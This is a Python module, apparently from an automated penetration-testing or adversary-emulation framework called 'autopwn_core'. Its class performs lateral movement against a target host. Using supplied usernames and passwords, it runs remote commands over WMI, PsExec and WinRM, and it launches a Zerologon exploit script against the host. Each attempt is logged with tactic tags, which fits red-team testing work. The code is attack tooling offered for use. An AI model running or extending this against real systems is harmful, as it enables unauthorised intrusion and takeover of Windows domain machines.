import subprocess
import logging
import random
from pathlib import Path
from typing import List, Dict, Optional

from autopwn_core.modules.persistence_checker import check_admin_access, get_target_sessions
from autopwn_core.shared.exec_wrappers import (
    execute_wmi_command, execute_psexec_command, execute_winrm_command
)
from autopwn_core.shared.artifacts import collect_artifact
from autopwn_core.shared.audit_logger import log_action
from autopwn_core.shared.tactics_mapping import TacticTag
from autopwn_core.shared.attack_context import AttackContext

logger = logging.getLogger("lateral_movement")

class LateralMovementTechnique:
    def __init__(self, ctx: AttackContext):
        self.ctx = ctx
        self.target_host = ctx.target_host
        self.username = ctx.username
        self.password = ctx.password
        self.domain = ctx.domain
        self.auth_type = ctx.auth_type
        self.remote_command = ctx.remote_command or "whoami"
        self.session_id = random.randint(1000, 9999)

    def _log(self, method: str, status: str, details: Optional[Dict] = None):
        log_action(
            actor="autopwn-lateral",
            action=f"lateral_movement_{method}",
            status=status,
            resource=self.target_host,
            metadata={
                "session_id": self.session_id,
                "username": self.username,
                "command": self.remote_command,
                **(details or {})
            },
            tags=[TacticTag.LATERAL_MOVEMENT]
        )

    def use_wmi(self):
        if not check_admin_access(self.target_host, self.username, self.password):
            self._log("wmi", "denied", {"reason": "no_admin"})
            return False

        result = execute_wmi_command(self.target_host, self.username, self.password, self.remote_command)
        self._log("wmi", "success", {"output": result})
        return result

    def use_psexec(self):
        if not check_admin_access(self.target_host, self.username, self.password):
            self._log("psexec", "denied", {"reason": "no_admin"})
            return False

        result = execute_psexec_command(self.target_host, self.username, self.password, self.remote_command)
        self._log("psexec", "success", {"output": result})
        return result

    def use_winrm(self):
        if not check_admin_access(self.target_host, self.username, self.password):
            self._log("winrm", "denied", {"reason": "no_admin"})
            return False

        result = execute_winrm_command(self.target_host, self.username, self.password, self.remote_command)
        self._log("winrm", "success", {"output": result})
        return result

    def use_zerologon(self):
        result = subprocess.run(["python3", "exploit/zerologon.py", self.target_host], capture_output=True, text=True)
        if result.returncode == 0:
            self._log("zerologon", "success", {"stdout": result.stdout})
        else:
            self._log("zerologon", "fail", {"stderr": result.stderr})
        return result.stdout

    def emulate(self, technique: str = "all") -> Dict[str, Optional[str]]:
        report = {}

        if technique in ("all", "wmi"):
            report["wmi"] = self.use_wmi()
        if technique in ("all", "psexec"):
            report["psexec"] = self.use_psexec()
        if technique in ("all", "winrm"):
            report["winrm"] = self.use_winrm()
        if technique in ("all", "zerologon"):
            report["zerologon"] = self.use_zerologon()

        collect_artifact(self.session_id, report, self.target_host, "lateral_movement")

        return report
